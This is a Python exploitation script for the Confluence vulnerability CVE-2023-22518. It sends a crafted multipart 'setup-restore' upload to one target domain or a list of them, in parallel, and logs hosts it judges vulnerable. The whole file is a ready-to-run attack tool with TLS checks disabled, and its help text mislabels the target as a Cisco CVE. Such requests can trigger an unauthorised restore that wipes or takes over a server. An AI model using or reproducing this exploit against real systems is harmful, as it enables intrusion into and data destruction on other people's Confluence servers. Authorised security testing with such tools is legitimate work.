import requests 
from colorama import Fore ,  Style , Back
import concurrent.futures
import random
import time as t
import argparse
import string
import os 
import urllib3
import time
from bs4 import BeautifulSoup
import warnings

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

requests.packages.urllib3.disable_warnings()

HEADERS = {
        "X-Atlassian-Token": "no-check",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7"
    }


green = Fore.GREEN

magenta = Fore.MAGENTA

cyan = Fore.CYAN

mixed = Fore.RED + Fore.BLUE

red = Fore.RED

blue = Fore.BLUE

yellow = Fore.YELLOW

white = Fore.WHITE

reset = Style.RESET_ALL

bold = Style.BRIGHT

target_list = []

colors = [ green, cyan, blue]

random_color = random.choice(colors)



def banner():
    
    banner = f"""{bold}{random_color}

    ______     ____  __         _ ______         
   / ____/  __/ __ \/ /  ____  (_)_  __/__  _____
  / __/ | |/_/ /_/ / /  / __ \/ / / / / _ \/ ___/
 / /____>  </ ____/ /__/ /_/ / / / / /  __/ /    
/_____/_/|_/_/   /_____|____/_/ /_/  \___/_/     
                                                   
                                            
                      Author   : D.SanjaiKumar @CyberRevoltSecurities  
                                              
                      Github   : https://github.com/sanjai-AK47
                      
                      LinkedIN : https://www.linkedin.com/in/d-sanjai-kumar-109a7227b/    
                                               

    {reset}"""
    word ="                     Exploiter an Exploitation Tool for Confluence CVE-2023-22518\n"


    print(banner)
    for char in word:
        print(f"{bold}{random_color}{char}{reset}", end='', flush=True)
        time.sleep(0.1)


parser =  argparse.ArgumentParser(description=f"[{bold}{blue}DESCTIPTION{reset}]: {bold}{white}Exploitation and Detection tool for Cisco CVE-2023-46747")

parser.add_argument("-d", "--domain", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Target domain for exploiting without protocol eg:(www.domain.com)", type=str)

parser.add_argument("-dL", "--domains-list", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Targets domain for exploiting without protocol eg:(www.domain.com)", type=str)

parser.add_argument("-o", '--output', help=f"[{bold}{blue}INFO{reset}]: {bold}{white}File name to save output", type=str)

parser.add_argument("-to", "--time-out", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching timeout will requests till for your timeout and also for BURPSUITE", type=int)

parser.add_argument("-px", "--proxy", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching proxy will send request to your configured proxy (eg: BURPSUITE)", type=str)

parser.add_argument("-v", "--verbose", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching Verbose will shows offline targets", action="store_true")

args = parser.parse_args()


def getter(lenght=10):
    
    lower = string.ascii_lowercase
    
    return ''.join(random.choice(lower) for i in range(lenght))
    



def exploit_https(url):
    
    try:
        
        proxies = {
            
            "http": f"{args.proxy}",
            "https": f"{args.proxy}"
        } if args.proxy else None
        
        timeout = args.time_out if args.time_out else 10
        
        base_url = f"https://{url}"
        
        randomiser = getter()
        
        data = (
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        "Content-Disposition: form-data; name=\"buildIndex\"\r\n\r\n"
        "true\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        f"Content-Disposition: form-data; name=\"file\";filename=\"{randomiser}.zip\"\r\n\r\n"
        f"{randomiser}\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        "Content-Disposition: form-data; name=\"edit\"\r\n\r\n"
        "Upload and import\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7--\r\n"
    )
        
        data = data.encode('utf-8')
        
        if not url.startswith("http://") and not url.startswith("https://"):
        
            response = requests.post(f"{base_url}/json/setup-restore.action?synchronous=true", data=data, timeout=timeout, verify=False, proxies=proxies, headers=HEADERS)
            
            pass_url = base_url
            
        else:
            
            response = requests.post(f"{url}/json/setup-restore.action?synchronous=true", data=data, timeout=timeout, verify=False, proxies=proxies, headers=HEADERS)
            
            pass_url = url  
            
        with warnings.catch_warnings():
                
                
                warnings.filterwarnings("ignore", category=UserWarning, module="bs4")
            
                soup = BeautifulSoup(response.content, "html.parser")
    
                code_tag = soup.find('code')
                
        code = code_tag.text if code_tag is not None else "Path not Found"
            
        if response.status_code == 200 and 'The zip file did not contain an entry' in response.text and 'exportDescriptor.properties' in response.text:
            
            print(f"[{bold}{green}VULNERABLE{reset}]: {bold}{white}HOST: {pass_url} | {bold}{white}Code: {bold}{green}{response.status_code}{reset} | {bold}{white}ServerPath{reset}: {bold}{green}{code}{reset}")
            
            exploit_save(url, response.status_code , code)
            
        else:
            
            print(f"[{bold}{red}NOT-VULNERABLE{reset}]: {bold}{white}HOST: {pass_url}{reset} | {bold}{white}Code: {bold}{red}{response.status_code}{reset}")  
        
    except requests.exceptions.RequestException as e:
        
        exploit_http(url)
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
    

    
def exploit_http(url):
    
    try:
        
        proxies = {
            
            "http": f"{args.proxy}",
            "https": f"{args.proxy}"
        } if args.proxy else None
        
        timeout = args.time_out if args.time_out else 10
        
        base_url = f"http://{url}"
        
        randomiser = getter()
        
        data = (
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        "Content-Disposition: form-data; name=\"buildIndex\"\r\n\r\n"
        "true\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        f"Content-Disposition: form-data; name=\"file\";filename=\"{randomiser}.zip\"\r\n\r\n"
        f"{randomiser}\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        "Content-Disposition: form-data; name=\"edit\"\r\n\r\n"
        "Upload and import\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7--\r\n"
    )
        
        data = data.encode('utf-8')
        
        if not url.startswith("http://") and not url.startswith("https://"):
        
            response = requests.post(f"{base_url}/json/setup-restore.action?synchronous=true", data=data, timeout=timeout, verify=False, proxies=proxies, headers=HEADERS)
            
            pass_url = base_url
            
        else:
            
            response = requests.post(f"{url}/json/setup-restore.action?synchronous=true", data=data, timeout=timeout, verify=False, proxies=proxies, headers=HEADERS)
            
            pass_url = url
            
        with warnings.catch_warnings():
                
                
                warnings.filterwarnings("ignore", category=UserWarning, module="bs4")
            
                soup = BeautifulSoup(response.content, "html.parser")
    
                code_tag = soup.find('code')
                
        code = code_tag.text if code_tag is not None else "Path not Found"
            
        if response.status_code == 200 and 'The zip file did not contain an entry' in response.text and 'exportDescriptor.properties' in response.text:
            
            print(f"[{bold}{green}VULNERABLE{reset}]: {bold}{white}HOST: {pass_url} | {bold}{white}Code: {bold}{green}{response.status_code}{reset} | {bold}{white}ServerPath{reset}: {bold}{green}{code}{reset}")
            
            exploit_save(url, response.status_code , code)
            
        else:
            
            print(f"[{bold}{red}NOT-VULNERABLE{reset}]: {bold}{white}HOST: {pass_url}{reset}| {bold}{white}Code: {bold}{red}{response.status_code}{reset}") 
        
    except requests.exceptions.RequestException as e:
        
        if args.verbose:
        
            print(f"\n[{bold}{red}OFFLINE{reset}]: {bold}{white}Failed looks target is {url}  offline{reset}")
        
            pass 
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
    
def exploit_save(url, status, path):
    
    try:
    
        if args.output:
            
            if os.path.isfile(args.output):
                
                filename = args.output
                
            elif os.path.isdir(args.output):
                
                filename = os.path.join(args.output, f"exploitation_results.txt")
                
            else:
                
                filename = args.output
                
        if not args.output:
            
            filename = f"exploitation_results.txt"
            
        
        with open(filename, "a") as w:
            
            w.write(f"HOST: {url} | Code: {status} | Path: {path}"+ '\n')
            
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
    
def speed_exploit(urls):
    
    try:
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            
            futures = [executor.submit(exploit_https, url)for url in urls]
            
        concurrent.futures.wait(futures)
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} CTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
    
def main():
    
    try:
        
        banner()
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
    
    try:
        
        if args.domain and not args.domains_list:
        
            url =  args.domain 
        
            target_list.append(url)
        
            speed_exploit(target_list)
                
        
        if args.domains_list and not args.domain:
            
        
            try:
                
            
                filename= args.domains_list
            
                with open(filename, "r") as url:
                
                    urls = url.read().split()
                
                for url in urls:
                
                    target_list.append(url)
                
                
                speed_exploit(target_list)

            
            except FileNotFoundError as e:
            
                print(f"[{bold}{red}ALERT{reset}]: {bold}{white}File not Found please check the file exits or not{reset}")
            
                exit()
            
            except KeyboardInterrupt as e:
        
                print(f"{bold}{bold} CTRL+C Pressed{reset}")
        
                exit()
        
            except Exception as e:
        
                print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
                
            
        if not args.domain and not args.domains_list:
        
        
            print(f"[{bold}{red}FLAG-ERROR{reset}]: {bold}{white}Please provide a domain or domains list for exploit{reset}")
            
        
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
        
        
if __name__ == "__main__":
    
    main()
